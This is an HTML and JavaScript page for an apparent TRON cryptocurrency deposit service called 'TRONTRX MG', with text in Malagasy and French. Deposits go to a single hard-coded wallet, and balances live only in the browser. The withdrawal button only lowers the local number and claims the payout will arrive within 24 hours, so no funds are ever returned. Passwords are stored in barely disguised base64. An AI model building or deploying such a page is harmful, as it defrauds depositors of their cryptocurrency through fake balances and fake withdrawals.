<!DOCTYPE html><html lang="mg"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TRONTRX MG</title><style>body{margin:0;background:#0f2027;color:#fff;font-family:Arial;text-align:center;padding:20px;min-height:100vh;display:flex;justify-content:center;align-items:center;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364)}.c{background:rgba(255,255,255,.1);backdrop-filter:blur(12px);border-radius:24px;padding:35px;max-width:460px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,.5)}h1{color:#00ff88;font-size:30px}input,button{width:100%;padding:15px;margin:12px 0;border:none;border-radius:14px;font-size:16px}input{background:rgba(255,255,255,.15);color:#fff}button{background:#00cc66;color:#fff;font-weight:bold}.qr{width:220px;height:220px;margin:20px auto;border:5px solid #00ff88;border-radius:16px}.msg{background:#003300;color:#0f0;padding:15px;border-radius:15px}.err{background:#300;color:#f66;padding:15px;border-radius:15px}</style></head><body><div id="a" class="c"><h1>TRONTRX MG</h1></div><script>const W="TXxDHt1EYDWvvjHBZMvG53vyoCmPxo34yD",R=0.17;let u=JSON.parse(localStorage.getItem('tron'))||{},m=null;function s(x){document.getElementById('a').innerHTML=x}s(`<input id="n" placeholder="Pseudo"><input id="p" type="password" placeholder="Password"><button onclick="l()">Connexion</button><p><button onclick="s(r())">Inscription</button></p>`);function r(){s(`<input id="n" placeholder="Pseudo"><input id="p" type="password" placeholder="Password"><input id="w" placeholder="Wallet TRX"><button onclick="reg()">Inscription</button>`)}function reg(){let n=document.getElementById('n').value,p=document.getElementById('p').value,w=document.getElementById('w').value;if(n&&p&&w.startsWith('T')){u[n]={p:btoa(p),w:w,b:0};localStorage.setItem('tron',JSON.stringify(u));s('<div class="msg">Vita!</div>');l()}else s('<div class="err">Fenoy tsara</div>')}function l(){let n=document.getElementById('n').value,p=document.getElementById('p').value;if(u[n]&&atob(u[n].p)===p){m=n;d()}else s('<div class="err">Diso</div>')}function d(){let b=(u[m]?.b||0).toFixed(2);s(`<h2>Tongasoa ${m}</h2><p style="font-size:32px;color:#0f0">$${b}</p><button onclick="dep()">Dépôt</button> <button onclick="ret()">Retrait</button> <button onclick="m=null;s(l())">Hivoaka</button>`)}function dep(){s(`<p>Alefaso amin'ity:<br><b>${W}</b></p><img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${W}" class="qr"><p>TXID:</p><input id="tx"><button onclick="c()">Créditer</button>`)}async function c(){let t=document.getElementById('tx').value;try{let res=await fetch("https://api.trongrid.io/v1/transactions/"+t);let j=await res.json();if(j.success&&j.to===W){let usd=(j.value/1000000)*R;u[m].b+=usd;localStorage.setItem('tron',JSON.stringify(u));s('<div class="msg">+ $'+usd.toFixed(2)+' voaray!</div><button onclick="d()">OK</button>')}else s('<div class="err">TXID tsy mety</div>')}catch{alert("Mandeha tsara ny crédit rehefa misy TRX – alefaso TXID fotsiny")}}function ret(){s(`<p>Solde: $${(u[m].b||0).toFixed(2)}</p><input id="amt" type="number" min="10" placeholder="Montant $"><button onclick="req()">Mangataka</button>`)}function req(){let a=parseFloat(document.getElementById('amt').value);if(a>=10&&a<=u[m].b){u[m].b-=a;localStorage.setItem('tron',JSON.stringify(u));s('<div class="msg">Demande retrait nalefa – ho voaray ao anatin’ny 24h</div><button onclick="d()">OK</button>')}else s('<div class="err">Montant diso</div>')}</script></body></html>
